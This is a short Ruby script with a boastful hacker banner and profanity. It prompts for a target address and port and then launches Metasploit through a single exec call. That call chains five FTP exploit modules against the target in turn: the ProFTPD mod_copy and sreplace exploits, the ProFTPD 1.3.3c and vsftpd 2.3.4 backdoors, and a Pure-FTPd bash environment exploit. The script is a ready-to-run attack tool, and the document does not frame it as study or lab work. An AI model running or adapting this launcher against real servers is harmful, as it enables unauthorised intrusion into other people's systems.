require 'colorize'
#    -x 'setg VERBOSE true'
#  -x 'setg RPORT #{$port}'
#  -x 'setg IMAPUSER #{user}' -x 'setg IMAPPASS #{user}'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """ 
     Its A Cluster Fuck Boys!! Lets Gets it!!!
""".red
puts """
		      COMBO Fucking WOMBO
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow

$target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow

$port = gets.chomp



begin
ensure

exec("msfconsole -x 'use exploit/linux/ftp/proftp_sreplace' -x 'setg RHOST #{$target}'  -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/unix/ftp/proftpd_modcopy_exec' -x 'setg RHOST #{$target}' -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/unix/ftp/proftpd_133c_backdoor' -x 'setg RHOST #{$target}'  -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/multi/ftp/pureftpd_bash_env_exec' -x 'setg RHOST #{$target}'  -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/unix/ftp/vsftpd_234_backdoor' -x 'setg RHOST #{$target}'  -x 'setg RPORT #{$port}' -x 'run'")
end







